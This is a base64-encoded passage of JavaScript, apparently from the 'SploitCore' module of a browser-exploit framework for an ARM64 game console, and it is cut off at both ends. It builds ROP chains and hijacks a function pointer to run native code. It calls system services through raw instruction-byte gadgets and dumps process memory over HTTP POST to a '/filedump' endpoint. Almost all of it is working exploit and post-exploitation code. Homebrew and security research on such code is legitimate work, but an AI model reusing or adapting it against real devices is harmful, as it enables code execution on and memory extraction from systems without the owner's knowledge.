MHgxMjAgKyAweDApID4+IDIpOyAgICAgICAgLy8gTG9hZCBYMjAgd2l0aCBzY3JhdGNoIHNwYWNlXG5cdHRoaXMud3JpdGU4KHV0aWxzLmFkZDIoZHVtcGFyZWEsIDB4MzIwKSwgc3AsICgweDEyMCArIDB4OCkgPj4gMik7ICAgICAgICAvLyBMb2FkIFgxOSA9IGR1bXBhcmVhICsgMHgzMjBcblx0dGhpcy53cml0ZTgoc3RyX3gwLCBzcCwgKDB4MTIwICsgMHgxOCkgPj4gMik7ICAgICAgICAgICAgICAgICAgICAgIC8vIExvYWQgTFIgd2l0aCBzdHIgeDBcblx0dGhpcy53cml0ZTgodXRpbHMuYWRkMihkdW1wYXJlYSwgMHgzODgpLCBzcCwgKDB4MTQwICsgMHgwKSA+PiAyKTsgICAgICAgIC8vIExvYWQgWDE5ID0gZHVtcGFyZWEgKyAweDM4OFxuXHR0aGlzLndyaXRlOCh1dGlscy5hZGQyKGR1bXBhcmVhLCAweDMyMCksIGR1bXBhcmVhLCAweDM4OCA+PiAyKTsgICAgICAgICAgLy8gV3JpdGUgZHVtcGFyZWEgKyAweDMyMCB0byBkdW1wYXJlYSArIDB4Mzg4XG5cdHRoaXMud3JpdGU4KGxvYWRfYW5kX3N0cl94OCwgc3AsICgweDE0MCArIDB4MTgpID4+IDIpOyAgICAgICAgICAgICAvLyBMb2FkIExSIHdpdGggbG9hZCwgU1RSIFg4XG5cdHRoaXMud3JpdGU4KHV0aWxzLmFkZDIoZHVtcGFyZWEsIDB4M0Y4KSwgc3AsICgweDE2MCArIDB4MCkgPj4gMik7ICAgICAgICAvLyBMb2FkIFgyMCB3aXRoIHNjcmF0Y2ggc3BhY2Vcblx0dGhpcy53cml0ZTgodXRpbHMuYWRkMihkdW1wYXJlYSwgMHgzMjggLSAweDU4KSwgc3AsICgweDE2MCArIDB4OCkgPj4gMik7IC8vIExvYWQgWDE5ID0gZHVtcGFyZWEgKyAweDMyOCAtIDB4NThcblx0dGhpcy53cml0ZTgoc3RyX3g5LCBzcCwgKDB4MTYwICsgMHgxOCkgPj4gMik7ICAgICAgICAgICAgICAgICAgICAgIC8vIExvYWQgTFIgd2l0aCBTVFIgWDlcblx0dGhpcy53cml0ZTgodXRpbHMuYWRkMihkdW1wYXJlYSwgMHgzOTApLCBzcCwgKDB4MTgwICsgMHgwKSA+PiAyKTsgICAgICAgIC8vIExvYWQgWDE5IHdpdGggZHVtcGFyZWEgKyAweDM5MFxuXHR0aGlzLndyaXRlOChibG9ja19zdHJ1Y3RfMywgZHVtcGFyZWEsIDB4MzkwID4+IDIpOyAgICAgICAgICAgICAgICAgLy8gV3JpdGUgYmxvY2sgc3RydWN0IDMgdG8gZHVtcGFyZWEgKyAweDM5MFxuXHR0aGlzLndyaXRlOChsb2FkX2FuZF9zdHJfeDgsIHNwLCAoMHgxODAgKyAweDE4KSA+PiAyKTsgICAgICAgICAgICAgLy8gTG9hZCBMUiB3aXRoIGxvYWQsIFNUUiBYOFxuXHR0aGlzLndyaXRlOChsb2FkX3gwX3cxX3gyX3g5X2Jscl94OSwgc3AsICgweDFBMCArIDB4MTgpID4+IDIpOyAgICAgLy8gTG9hZCBMUiB3aXRoIGdhZGdldCAyXG5cblx0Ly8gQmxvY2sgU3RydWN0IDNcblx0dGhpcy53cml0ZTgoZHVtcGFyZWEsIGJsb2NrX3N0cnVjdF8zLCAweDAwID4+IDIpO1xuXHR0aGlzLndyaXRlOChsb2FkX3gzMF9mcm9tX3NwX2JyX3gyLCBibG9ja19zdHJ1Y3RfMywgMHgxMCA+PiAyKTtcblx0dGhpcy53cml0ZTgoc2F2ZWdhZGcsIGJsb2NrX3N0cnVjdF8zLCAweDM4ID4+IDIpO1xuXG5cdHRoaXMud3JpdGU4KHV0aWxzLmFkZDIoc3RyX3gyMCwgMHg0KSwgc3AsICgweDFDMCArIDB4MjgpID4+IDIpOyAgICAgICAgICAvLyBMb2FkIExSIHdpdGggTEQgWDE5LCBYMjAsIFgzMFxuXHR0aGlzLndyaXRlOCh1dGlscy5hZGQyKHNhdmVhcmVhLCAweEY4KSwgc3AsICgweDFGMCArIDB4MCkgPj4gMik7ICAgICAgICAgLy8gTG9hZCBYMjAgd2l0aCBzYXZlYXJlYSArIDB4RjggKHNhdmVkIFNQKVxuXHR0aGlzLndyaXRlOCh1dGlscy5hZGQyKGR1bXBhcmVhLCAweDM5OCksIHNwLCAoMHgxRjAgKyAweDgpID4+IDIpOyAgICAgLy8gTG9hZCBYMTkgd2l0aCBkdW1wYXJlYSArIDB4Mzk4XG5cdHRoaXMud3JpdGU4KGJhc2Vfc3AsIGR1bXBhcmVhLCAweDM5OCA+PiAyKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBXcml0ZSBTUCB0byBkdW1wYXJlYSArIDB4Mzhcblx0dGhpcy53cml0ZTgobG9hZF9hbmRfc3RyX3g4LCBzcCwgKDB4MUYwICsgMHgxOCkgPj4gMik7ICAgICAgICAgICAgICAgICAgIC8vIExvYWQgWDMwIHdpdGggTEQsIFNUUiBYOFxuXHR0aGlzLndyaXRlOCh1dGlscy5hZGQyKHNhdmVhcmVhLCAweDEwMCksIHNwLCAoMHgyMTAgKyAweDApID4+IDIpOyAgICAgICAgLy8gTG9hZCBYMjAgd2l0aCBzYXZlYXJlYSArIDB4MTAwIChzYXZlZCBMUilcblx0dGhpcy53cml0ZTgodXRpbHMuYWRkMihkdW1wYXJlYSwgMHgzQTApLCBzcCwgKDB4MjEwICsgMHg4KSA+PiAyKTsgICAgIC8vIExvYWQgWDE5IHdpdGggZHVtcGFyZWEgKyAweDNBMFxuXHR0aGlzLndyaXRlOChyZXR1cm5nYWRnLCBkdW1wYXJlYSwgMHgzQTAgPj4gMik7ICAgICAgICAgICAgICAgICAgICAgICAgLy8gV3JpdGUgcmV0dXJuIGdhZGdldCB0byBkdW1wYXJlYSArIDB4M0EwXG5cdHRoaXMud3JpdGU4KGxvYWRfYW5kX3N0cl94OCwgc3AsICgweDIxMCArIDB4MTgpID4+IDIpOyAgICAgICAgICAgICAgICAgICAvLyBMb2FkIFgzMCB3aXRoIExELCBTVFIgWDhcblx0dGhpcy53cml0ZTgodXRpbHMuYWRkMihzYXZlYXJlYSwgMHhDMCksIHNwLCAoMHgyMzAgKyAweDApID4+IDIpOyAgICAgICAgIC8vIExvYWQgWDIwIHdpdGggc2F2ZWFyZWEgKyAweEMwIChzYXZlZCBYMjQpXG5cdHRoaXMud3JpdGU4KHV0aWxzLmFkZDIoZHVtcGFyZWEsIDB4M0E4KSwgc3AsICgweDIzMCArIDB4OCkgPj4gMik7ICAgICAvLyBMb2FkIFgxOSB3aXRoIGR1bXBhcmVhICsgMHgzQThcblx0dGhpcy53cml0ZTgoWzB4MDAwMDAwMDAsIDB4ZmZmZjAwMDBdLCBkdW1wYXJlYSwgMHgzQTggPj4gMik7ICAgICAgICAgIC8vIFdyaXRlIHJldHVybiBnYWRnZXQgdG8gZHVtcGFyZWEgKyAweDNBOFxuXHR0aGlzLndyaXRlOChsb2FkX2FuZF9zdHJfeDgsIHNwLCAoMHgyMzAgKyAweDE4KSA+PiAyKTsgICAgICAgICAgICAgICAgICAgLy8gTG9hZCBYMzAgd2l0aCBMRCwgU1RSIFg4XG5cdHRoaXMud3JpdGU4KHNhdmVhcmVhLCBzcCwgKDB4MjUwICsgMHg4KSA+PiAyKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBMb2FkIFgxOSB3aXRoIHNhdmVhcmVhXG5cdHRoaXMud3JpdGU4KG1vdl94MTlfaW50b194MCwgc3AsICgweDI1MCArIDB4MTgpID4+IDIpOyAgICAgICAgICAgICAgICAgICAvLyBMb2FkIFgzMCB3aXRoIG1vdiB4MCwgeDE5LlxuXHR0aGlzLndyaXRlOChsb2FkZ2FkZywgc3AsICgweDI3MCArIDB4MTgpID4+IDIpOyAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gTG9hZCBYMzAgd2l0aCBjb250ZXh0IGxvYWRcblxuXHR1dGlscy5kbG9nKCdBc3NpZ25pbmcgZnVuY3Rpb24gcG9pbnRlcicpO1xuXG5cdHZhciBmdW5jYWRkciA9IHRoaXMuZ2V0RnVuY0FkZHIoKTtcblx0dXRpbHMuZGxvZygnRnVuY3Rpb24gb2JqZWN0IGF0ICcgKyB1dGlscy5wYWRkcihmdW5jYWRkcikpO1xuXHR2YXIgY3VycHRyID0gdGhpcy5yZWFkOChmdW5jYWRkciwgOCk7XG5cdHRoaXMud3JpdGU4KGphZGRyLCBmdW5jYWRkciwgOCk7XG5cdHV0aWxzLmRsb2coJ1BhdGNoZWQgZnVuY3Rpb24gYWRkcmVzcyBmcm9tICcgKyB1dGlscy5wYWRkcihjdXJwdHIpICsgJyB0byAnICsgdXRpbHMucGFkZHIodGhpcy5yZWFkOChmdW5jYWRkciwgOCkpKTtcblx0dXRpbHMuZGxvZygnSnVtcGluZy4nKTtcblx0dGhpcy5mdW5jLmFwcGx5KDB4MTAwLCBbMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgY2FyciwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMF0pO1xuXHR1dGlscy5kbG9nKCdKdW1wZWQgYmFjay4nKTtcblxuXHR0aGlzLndyaXRlOChjdXJwdHIsIGZ1bmNhZGRyLCA4KTtcblx0dXRpbHMuZGxvZygnUmVzdG9yZWQgb3JpZ2luYWwgZnVuY3Rpb24gcG9pbnRlci4nKTtcblxuXHR2YXIgcmV0ID0gdGhpcy5yZWFkOChkdW1wYXJlYSwgMHgzMjAgPj4gMik7XG5cblx0aWYgKGR1bXBfcmVncykge1xuXHRcdHV0aWxzLmxvZygnUmVnaXN0ZXIgZHVtcCBwb3N0LWNvZGUgZXhlY3V0aW9uOicpO1xuXHRcdGZvciAodmFyIGkgPSAwOyBpIDw9IDMwOyBpKyspIHtcblx0XHRcdGlmIChpID09PSAwKSB7XG5cdFx0XHRcdHV0aWxzLmxvZygnWDA6ICcgKyB1dGlscy5wYWRkcih0aGlzLnJlYWQ4KGR1bXBhcmVhLCAweDMyMCA+PiAyKSkpO1xuXHRcdFx0fSBlbHNlIGlmIChpID09PSAxKSB7XG5cdFx0XHRcdHV0aWxzLmxvZygnWDE6ICcgKyB1dGlscy5wYWRkcih0aGlzLnJlYWQ4KGR1bXBhcmVhLCAweDMxMCA+PiAyKSkpO1xuXHRcdFx0fSBlbHNlIGlmIChpID09PSAyKSB7XG5cdFx0XHRcdHV0aWxzLmxvZygnWDI6ICcgKyB1dGlscy5wYWRkcih0aGlzLnJlYWQ4KGR1bXBhcmVhLCAweDMxOCA+PiAyKSkpO1xuXHRcdFx0fSBlbHNlIGlmIChpID09PSA4KSB7XG5cdFx0XHRcdHV0aWxzLmxvZygnWDg6ICcgKyB1dGlscy5wYWRkcih0aGlzLnJlYWQ4KGR1bXBhcmVhLCAweDMwOCA+PiAyKSkpO1xuXHRcdFx0fSBlbHNlIGlmIChpID09PSA5KSB7XG5cdFx0XHRcdHV0aWxzLmxvZygnWDk6ICcgKyB1dGlscy5wYWRkcih0aGlzLnJlYWQ4KGR1bXBhcmVhLCAweDMyOCA+PiAyKSkpO1xuXHRcdFx0fSBlbHNlIGlmIChpID09PSAyMCkge1xuXHRcdFx0XHR1dGlscy5sb2coJ1gyMDogJyArIHV0aWxzLnBhZGRyKHRoaXMucmVhZDgoZHVtcGFyZWEsIDB4MzAwID4+IDIpKSk7XG5cdFx0XHR9IGVsc2UgaWYgKGkgPT09IDE2IHx8IGkgPT09IDE5IHx8IGkgPT09IDI5IHx8IGkgPT09IDMwKSB7XG5cdFx0XHRcdHV0aWxzLmxvZygnWCcgKyBpICsgJzogTm90IGR1bXBhYmxlLicpO1xuXHRcdFx0fSBlbHNlIHtcblx0XHRcdFx0dXRpbHMubG9nKCdYJyArIGkgKyAnOiAnICsgdXRpbHMucGFkZHIodGhpcy5yZWFkOChkdW1wYXJlYSwgKDggKiBpKSA+PiAyKSkpO1xuXHRcdFx0fVxuXHRcdH1cblx0fVxuXG5cdHV0aWxzLmRsb2coJ05hdGl2ZSBjb2RlIGF0ICcgKyB1dGlscy5wYWRkcihmdW5jcHRyKSArICcgcmV0dXJuZWQ6ICcgKyB1dGlscy5wYWRkcihyZXQpKTtcblxuXHR0aGlzLmZyZWUoY29udGV4dF9sb2FkX3N0cnVjdCk7XG5cdHRoaXMuZnJlZShibG9ja19zdHJ1Y3RfMCk7XG5cdHRoaXMuZnJlZShibG9ja19zdHJ1Y3RfMSk7XG5cdHRoaXMuZnJlZShibG9ja19zdHJ1Y3RfMik7XG5cdHRoaXMuZnJlZShibG9ja19zdHJ1Y3RfMyk7XG5cdHRoaXMuZnJlZShzYXZlYXJlYSk7XG5cdHRoaXMuZnJlZShsb2FkYXJlYSk7XG5cdHRoaXMuZnJlZShkdW1wYXJlYSk7XG5cblx0dXRpbHMuZGxvZygnRnJlZWQgYWxsIGJ1ZmZlcnMnKTtcblxuXHR1dGlscy5kbG9nKCdGb3JjaW5nIGdhcmJhZ2UgY29sbGVjdGlvbi4uLicpO1xuXHR0aGlzLmdjKCk7XG5cdHV0aWxzLmRsb2coJ0NvbGxlY3RlZCBnYXJiYWdlIScpO1xuXG5cdHJldHVybiByZXQ7XG59O1xuXG4vKipcblx0Q2FsbCBhIHNwZWNpZmljIHN2YyB3aXRoIGFyZ3VtZW50c1xuXHRAcGFyYW0ge251bWJlcn0gaWQgLSBJRCBvZiB0aGUgU1ZDXG5cdEBwYXJhbSB7QXJyYXkuPGFueT59IGFyZ3MgLSBBcmd1bWVudHMgdG8gcGFzc1xuXHRAcGFyYW0ge2Jvb2xlYW59IGR1bXBfcmVncyAtIER1bXAgcmVnaXN0ZXJzXG4gKi9cblNwbG9pdENvcmUucHJvdG90eXBlLnN2YyA9IGZ1bmN0aW9uIChpZCwgYXJncywgZHVtcF9yZWdzKSB7XG5cdHZhciBzdmNfbGlzdCA9IHtcblx0XHQweDAxOiBbMHhFMCwgMHgwRiwgMHgxRiwgMHhGOCwgMHgyMSwgMHgwMCwgMHgwMCwgMHhENF0sXG5cdFx0MHgwMjogWzB4NDEsIDB4MDAsIDB4MDAsIDB4RDQsIDB4QzAsIDB4MDMsIDB4NUYsIDB4RDZdLFxuXHRcdDB4MDM6IFsweDYxLCAweDAwLCAweDAwLCAweEQ0LCAweEMwLCAweDAzLCAweDVGLCAweEQ2XSxcblx0XHQweDA0OiBbMHg4MSwgMHgwMCwgMHgwMCwgMHhENCwgMHhDMCwgMHgwMywgMHg1RiwgMHhENl0sXG5cdFx0MHgwNTogWzB4QTEsIDB4MDAsIDB4MDAsIDB4RDQsIDB4QzAsIDB4MDMsIDB4NUYsIDB4RDZdLFxuXHRcdDB4MDY6IFsweEUxLCAweDBGLCAweDFGLCAweEY4LCAweEMxLCAweDAwLCAweDAwLCAweEQ0XSxcblx0XHQweDA3OiBbMHhFMSwgMHgwMCwgMHgwMCwgMHhENCwgMHhDMCwgMHgwMywgMHg1RiwgMHhENl0sXG5cdFx0MHgwODogWzB4RTAsIDB4MEYsIDB4MUYsIDB4RjgsIDB4MDEsIDB4MDEsIDB4MDAsIDB4RDRdLFxuXHRcdDB4MDk6IFsweDIxLCAweDAxLCAweDAwLCAweEQ0LCAweEMwLCAweDAzLCAweDVGLCAweEQ2XSxcblx0XHQweDBBOiBbMHg0MSwgMHgwMSwgMHgwMCwgMHhENCwgMHhDMCwgMHgwMywgMHg1RiwgMHhENl0sXG5cdFx0MHgwQjogWzB4NjEsIDB4MDEsIDB4MDAsIDB4RDQsIDB4QzAsIDB4MDMsIDB4NUYsIDB4RDZdLFxuXHRcdDB4MEM6IFsweEUwLCAweDBGLCAweDFGLCAweEY4LCAweDgxLCAweDAxLCAweDAwLCAweEQ0XSxcblx0XHQweDBEOiBbMHhBMSwgMHgwMSwgMHgwMCwgMHhENCwgMHhDMCwgMHgwMywgMHg1RiwgMHhENl0sXG5cdFx0MHgwRTogWzB4RTAsIDB4MDcsIDB4QkYsIDB4QTksIDB4QzEsIDB4MDEsIDB4MDAsIDB4RDRdLFxuXHRcdDB4MEY6IFsweEUxLCAweDAxLCAweDAwLCAweEQ0LCAweEMwLCAweDAzLCAweDVGLCAweEQ2XSxcblx0XHQweDEwOiBbMHgwMSwgMHgwMiwgMHgwMCwgMHhENCwgMHhDMCwgMHgwMywgMHg1RiwgMHhENl0sXG5cdFx0MHgxMTogWzB4MjEsIDB4MDIsIDB4MDAsIDB4RDQsIDB4QzAsIDB4MDMsIDB4NUYsIDB4RDZdLFxuXHRcdDB4MTI6IFsweDQxLCAweDAyLCAweDAwLCAweEQ0LCAweEMwLCAweDAzLCAweDVGLCAweEQ2XSxcblx0XHQweDEzOiBbMHg2MSwgMHgwMiwgMHgwMCwgMHhENCwgMHhDMCwgMHgwMywgMHg1RiwgMHhENl0sXG5cdFx0MHgxNDogWzB4ODEsIDB4MDIsIDB4MDAsIDB4RDQsIDB4QzAsIDB4MDMsIDB4NUYsIDB4RDZdLFxuXHRcdDB4MTU6IFsweEUwLCAweDBGLCAweDFGLCAweEY4LCAweEExLCAweDAyLCAweDAwLCAweEQ0XSxcblx0XHQweDE2OiBbMHhDMSwgMHgwMiwgMHgwMCwgMHhENCwgMHhDMCwgMHgwMywgMHg1RiwgMHhENl0sXG5cdFx0MHgxNzogWzB4RTEsIDB4MDIsIDB4MDAsIDB4RDQsIDB4QzAsIDB4MDMsIDB4NUYsIDB4RDZdLFxuXHRcdDB4MTg6IFsweEUwLCAweDBGLCAweDFGLCAweEY4LCAweDAxLCAweDAzLCAweDAwLCAweEQ0XSxcblx0XHQweDE5OiBbMHgyMSwgMHgwMywgMHgwMCwgMHhENCwgMHhDMCwgMHgwMywgMHg1RiwgMHhENl0sXG5cdFx0MHgxQTogWzB4NDEsIDB4MDMsIDB4MDAsIDB4RDQsIDB4QzAsIDB4MDMsIDB4NUYsIDB4RDZdLFxuXHRcdDB4MUI6IFsweDYxLCAweDAzLCAweDAwLCAweEQ0LCAweEMwLCAweDAzLCAweDVGLCAweEQ2XSxcblx0XHQweDFDOiBbMHg4MSwgMHgwMywgMHgwMCwgMHhENCwgMHhDMCwgMHgwMywgMHg1RiwgMHhENl0sXG5cdFx0MHgxRDogWzB4QTEsIDB4MDMsIDB4MDAsIDB4RDQsIDB4QzAsIDB4MDMsIDB4NUYsIDB4RDZdLFxuXHRcdC8vIDB4MUU6ICxcblx0XHQweDFGOiBbMHhFMCwgMHgwRiwgMHgxRiwgMHhGOCwgMHhFMSwgMHgwMywgMHgwMCwgMHhENF0sXG5cdFx0Ly8gMHgyMDogLFxuXHRcdDB4MjE6IFsweDIxLCAweDA0LCAweDAwLCAweEQ0LCAweEMwLCAweDAzLCAweDVGLCAweEQ2XSxcblx0XHQweDIyOiBbMHg0MSwgMHgwNCwgMHgwMCwgMHhENCwgMHhDMCwgMHgwMywgMHg1RiwgMHhENl0sXG5cdFx0Ly8gMHgyMzogMHgsXG5cdFx0Ly8gMHgyNDogMHgsXG5cdFx0MHgyNTogWzB4RTAsIDB4MEYsIDB4MUYsIDB4RjgsIDB4QTEsIDB4MDQsIDB4MDAsIDB4RDRdLFxuXHRcdDB4MjY6IFsweEMxLCAweDA0LCAweDAwLCAweEQ0LCAweEMwLCAweDAzLCAweDVGLCAweEQ2XSxcblx0XHQweDI3OiBbMHhFMSwgMHgwNCwgMHgwMCwgMHhENCwgMHhDMCwgMHgwMywgMHg1RiwgMHhENl0sXG5cdFx0MHgyODogWzB4MDEsIDB4MDUsIDB4MDAsIDB4RDQsIDB4QzAsIDB4MDMsIDB4NUYsIDB4RDZdLFxuXHRcdDB4Mjk6IFsweEUwLCAweDBGLCAweDFGLCAweEY4LCAweDIxLCAweDA1LCAweDAwLCAweEQ0XSxcblx0XHQvLyAweDJBLTB4MkJcblx0XHQweDJDOiBbMHg4MSwgMHgwNSwgMHgwMCwgMHhENCwgMHhDMCwgMHgwMywgMHg1RiwgMHhENl0sXG5cdFx0MHgyRDogWzB4QTEsIDB4MDUsIDB4MDAsIDB4RDQsIDB4QzAsIDB4MDMsIDB4NUYsIDB4RDZdLFxuXHRcdC8vIDB4MkUtMHg0RlxuXHRcdDB4NTA6IFsweEUwLCAweDBGLCAweDFGLCAweEY4LCAweDAxLCAweDBBLCAweDAwLCAweEQ0XSxcblx0XHQweDUxOiBbMHgyMSwgMHgwQSwgMHgwMCwgMHhENCwgMHhDMCwgMHgwMywgMHg1RiwgMHhENl0sXG5cdFx0MHg1MjogWzB4NDEsIDB4MEEsIDB4MDAsIDB4RDQsIDB4QzAsIDB4MDMsIDB4NUYsIDB4RDZdXG5cdH07XG5cblx0aWYgKCEoaWQgaW4gc3ZjX2xpc3QpKSB7XG5cdFx0dGhyb3cgbmV3IEVycm9yKCdGYWlsZWQgdG8gY2FsbCBzdmMgMHgnICsgaWQudG9TdHJpbmcoMTYpICsgJy4nKTtcblx0fVxuXG5cdHJldHVybiB0aGlzLmNhbGwodGhpcy5nYWRnZXQoc3ZjX2xpc3RbaWRdKSwgYXJncywgW10sIFtdLCBkdW1wX3JlZ3MpO1xufTtcblxuLyoqXG5cdFRPRE8gRE9DU1xuICovXG5TcGxvaXRDb3JlLnByb3RvdHlwZS5nZXRUTFMgPSBmdW5jdGlvbiAoKSB7XG5cdHJldHVybiB0aGlzLmNhbGwodGhpcy5nYWRnZXQoWzB4NjAsIDB4ZDAsIDB4M2IsIDB4ZDUsIDB4YzAsIDB4MDMsIDB4NWYsIDB4ZDZdKSwgW10pO1xufTtcblxuLyoqXG5cdFRPRE8gRE9DU1xuICovXG5TcGxvaXRDb3JlLnByb3RvdHlwZS5zdHIyYnVmID0gZnVuY3Rpb24gKGlucCkge1xuXHR2YXIgbGVuID0gaW5wLmxlbmd0aCArIDE7XG5cdHZhciB2ID0gdGhpcy5tYWxsb2MobGVuKTtcblx0dGhpcy5tZW12aWV3KHYsIGxlbiwgZnVuY3Rpb24gKHZpZXcpIHtcblx0XHR2YXIgdThiID0gbmV3IFVpbnQ4QXJyYXkodmlldyk7XG5cdFx0Zm9yICh2YXIgaiA9IDA7IGogPCBsZW47ICsraikgeyB1OGJbal0gPSBpbnAuY2hhckNvZGVBdChqKTsgfVxuXHRcdHU4YltpbnAubGVuZ3RoXSA9IDA7XG5cdH0pO1xuXG5cdHJldHVybiB2O1xufTtcblxuLyoqXG5cdEluaXRpYXRlIGEgbWVtb3J5IGR1bXAgb3ZlciBIVFRQXG5cdEBwYXJhbSB7dTY0fSBvZmZzZXQgLSBNZW1vcnkgYWRkcmVzcyB0byBzdGFydCBmcm9tIFxuXHRAcGFyYW0ge251bWJlcn0gc2l6ZSAtIE51bWJlciBvZiBieXRlcyB5b3Ugd2lzaCB0byBkdW1wXG5cdEBwYXJhbSB7c3RyaW5nfSBmaWxlTmFtZSAtIE5hbWUgb2YgZmlsZSwgdXNlZCB0byBzZXQgQ29udGVudC1EaXNwb3NpdGlvblxuICovXG5TcGxvaXRDb3JlLnByb3RvdHlwZS5tZW1kdW1wID0gZnVuY3Rpb24gKG9mZnNldCwgc2l6ZSwgZmlsZU5hbWUpIHtcblx0aWYoQXJyYXlCdWZmZXIuaXNWaWV3KG9mZnNldCkgfHwgb2Zmc2V0IGluc3RhbmNlb2YgQXJyYXlCdWZmZXIpIHtcblx0XHRvZmZzZXQgPSB0aGlzLmdldEFycmF5QnVmZmVyQWRkcihvZmZzZXQpO1xuXHR9XG5cdHZhciB0b3RhbFNpemUgPSB1dGlscy50cnVuYzMyKHNpemUpO1xuXHR2YXIgaWR4ID0gMDtcblxuXHR1dGlscy5kbG9nKCdEdW1waW5nIG1lbW9yeSEnKTtcblx0Zm9yICh2YXIgaWR4ID0gMDsgaWR4IDwgdG90YWxTaXplOyBpZHggKz0gMHg4MDAwMDApIHtcblx0XHRzaXplID0gdG90YWxTaXplIC0gaWR4O1xuXHRcdHNpemUgPSBzaXplID4gMHg4MDAwMDAgPyAweDgwMDAwMCA6IHNpemU7XG5cblx0XHR0aGlzLm1lbXZpZXcodXRpbHMuYWRkMihvZmZzZXQsIGlkeCksIHNpemUsIGZ1bmN0aW9uIChhYikge1xuXHRcdFx0dmFyIHZpZXcgPSBuZXcgVWludDhBcnJheShhYik7XG5cdFx0XHR2YXIgeGhyID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7XG5cdFx0XHR4aHIub3BlbignUE9TVCcsICcvZmlsZWR1bXAnLCBmYWxzZSk7XG5cdFx0XHR4aHIuc2V0UmVxdWVzdEhlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScpO1xuXHRcdFx0eGhyLnNldFJlcXVlc3RIZWFkZXIoJ0NvbnRlbnQtRGlzcG9zaXRpb24nLCBmaWxlTmFtZSk7XG5cdFx0XHR4aHIuc2VuZCh2aWV3KTtcblx0XHR9KTtcblx0fVxuXHR1dGlscy5kbG9nKCdEdW1wZWQgbWVtb3J5IHN1Y2Nlc2Z1bGx5IScpO1xufTtcblxuLyoqXG5cdEZvcmNlcyB0aGUgZ2FyYmFnZSBjb2xsZWN0b3IgdG8gcnVuXG4gKi9cblNwbG9pdENvcmUucHJvdG90eXBlLmdjID0gZnVuY3Rpb24gKCkge1xuXHR1dGlscy5kbG9nKCdCZWdpbm5pbmcgR0MgZm9yY2UnKTtcblx0ZnVuY3Rpb24gc3ViIChkZXB0aCkge1xuXHRcdHV0aWxzLmRsb2coJ0dDIGZvcmNlICcgKyBkZXB0aCk7XG5cdFx0aWYgKGRlcHRoID4gMCkge1xuXHRcdFx0dmFyIGFyciA9IFtdO1xuXHRcdFx0dXRpbHMuZGxvZygnQnVpbGRpbmcuLi4nKTtcblx0XHRcdGZvciAodmFyIGkgPSAwOyBpIDwgMTA7ICsraSkge1xuXHRcdFx0XHRhcnIucHVzaChuZXcgVWludDhBcnJheSgweDQwMDAwKSk7XG5cdFx0XHR9XG5cdFx0XHR1dGlscy5kbG9nKCdTaGlmdGluZy4uLicpO1xuXHRcdFx0d2hpbGUgKGFyci5sZW5ndGggPiAwKSB7XG5cdFx0XHRcdGFyci5zaGlmdCgpO1xuXHRcdFx0fVxuXHRcdFx0c3ViKGRlcHRoIC0gMSk7XG5cdFx0fVxuXHR9XG5cdHN1YigyMCk7XG5cdHV0aWxzLmRsb2coJ0dDIHNob3VsZCBiZSBzb2xpZCcpO1xufTtcblxuLyoqXG5cdFJlYWRzIGEgc3RyaW5nIGZyb20gbWVtb3J5XG5cdEBwYXJhbSB7dTY0fSBhZGRyIC0gQWRkcmVzcyB0byBzdGFydCBmcm9tXG5cdEBwYXJhbSB7bnVtYmVyfSBsZW5ndGggLSBOdW1iZXIgb2YgYnl0ZXMgdG8gcmVhZFxuXHRAcmV0dXJucyB7c3RyaW5nfVxuICovXG5TcGxvaXRDb3JlLnByb3RvdHlwZS5yZWFkU3RyaW5nID0gZnVuY3Rpb24gKGFkZHIsIGxlbmd0aCkge1xuXHRpZiAoYXJndW1lbnRzLmxlbmd0aCA9PT0gMSkge1xuXHRcdGxlbmd0aCA9IC0xO1xuXHR9XG5cblx0cmV0dXJuIHRoaXMubWVtdmlldyhhZGRyLCAweEZGRkZGRkZGLCBmdW5jdGlvbiAodmlldykge1xuXHRcdHZhciB1OGIgPSBuZXcgVWludDhBcnJheSh2aWV3KTtcblx0XHR2YXIgb3V0ID0gJyc7XG5cblx0XHRmb3IgKHZhciBpID0gMDsgKGxlbmd0aCA9PT0gLTEgJiYgdThiW2ldICE9PSAwKSB8fCAobGVuZ3RoICE9PSAtMSAmJiBpIDwgbGVuZ3RoKTsgaSsrKSB7XG5cdFx0XHRvdXQgKz0gU3RyaW5nLmZyb21DaGFyQ29kZSh1OGJbaV0pO1xuXHRcdH1cblxuXHRcdHJldHVybiBvdXQ7XG5cdH0pO1xufTtcblxuLyoqXG5cdENvcHkgbWVtb3J5IGZyb20gb25lIHJlZ2lvbiB0byBhbm90aGVyXG5cdEBwYXJhbSB7dTY0fSBkc3QgLSBCYXNlIGRlc3RpbmF0aW9uIGFkZHJlc3Ncblx0QHBhcmFtIHt1NjR9IHNyYyAtIEJhc2Ugc291cmNlIGFkZHJlc3Ncblx0QHBhcmFtIHtudW1iZXJ9IHNpemUgLSBOdW1iZXIgb2YgYnl0ZXMgdG8gY29weVxuICovXG5TcGxvaXRDb3JlLnByb3RvdHlwZS5tZW1jcHkgPSBmdW5jdGlvbiAoZHN0LCBzcmMsIHNpemUpIHtcblx0dGhpcy5jYWxsKHRoaXMuZ2FkZ2V0KCdlYjAzMDFjYjY5MDk0MDkyM2YwMTAyZWI2MjAyMDA1NGM5MDIwMGI0ZTgwMzAxYWFlYTAzMDBhYScpLCBbZHN0LCBzcmMsIHNpemVdKTtcbn07XG5cblNwbG9pdENvcmUucHJvdG90eXBlLklGaWxlID0gSUZpbGU7XG5TcGxvaXRDb3JlLnByb3RvdHlwZS5JRmlsZVN5c3RlbSA9IElGaWxlU3lzdGVtO1xuU3Bsb2l0Q29yZS5wcm90b3R5cGUuSURpcmVjdG9yeSA9IElEaXJlY3Rvcnk7XG5cbm1vZHVsZS5leHBvcnRzID0gU3Bsb2l0Q29yZTtcbiIsInZhciBSZXN1bHQgPSByZXF1aXJlKCcuL1Jlc3VsdCcpO1xudmFyIFJlc3VsdENvZGUgPSByZXF1aXJlKCcuL1Jlc3VsdENvZGUnKTtcbnZhciB1dGlscyA9IHJlcXVpcmUoJy4vdXRpbHMnKTtcblxudmFyIHN2Y01peGluID0ge307XG5zdmNNaXhpbi5zdmNXaXRoUmVzdWx0ID0gZnVuY3Rpb24gKGlkLCBhcmdzLCBkdW1wUmVncykge1xuXHR2YXIgcmV0ID0gdGhpcy5zdmM